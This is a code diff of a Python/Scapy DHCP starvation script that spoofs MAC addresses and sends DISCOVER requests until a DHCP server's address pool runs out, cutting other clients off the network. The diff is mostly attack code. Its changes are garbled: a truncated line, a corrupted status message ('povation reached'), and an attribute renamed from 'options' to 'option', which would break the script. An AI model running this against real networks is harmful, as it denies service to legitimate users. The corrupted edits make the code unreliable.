@@ -32,9 +32,9 @@ def starve(iface, max_leases=254):
         xid = random.randint(1, 0xFFFFFFFF)
         chaddr = mac_to_bytes(src_mac)
 
-        # ---- DHCPDISCOVER (broadcast) ----
+         # ---- DHCPDISCOVER (broadcast) ----
         discover = (
-            Ether(src
+            Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
             IP(src="0.0.0.0", dst="255.255.255.255") /
             UDP(sport=68, dport=67) /
             BOOTP(chaddr=chaddr, xid=xid, flags=0x8000) /
@@ -43,12 +43,12 @@ def starve(iface, max_leases=254):
 
         offer = srp1(discover, iface=iface, timeout=3, verbose=0)
         if offer is None:
-            print("[*] No OFFER received — pool appears exhausted. Starvation reached.")
+            print("[*] No OFFER received — povation reached.")
             break
 
         offered_ip = offer[BOOTP].yiaddr
         server_id = next(
-            (o[1] for o in offer[DHCP].options
+            (o[1] for o in offer[DHCP].option
              if isinstance(o, tuple) and o[0] == "server_id"),
             offer[IP].src,
         )
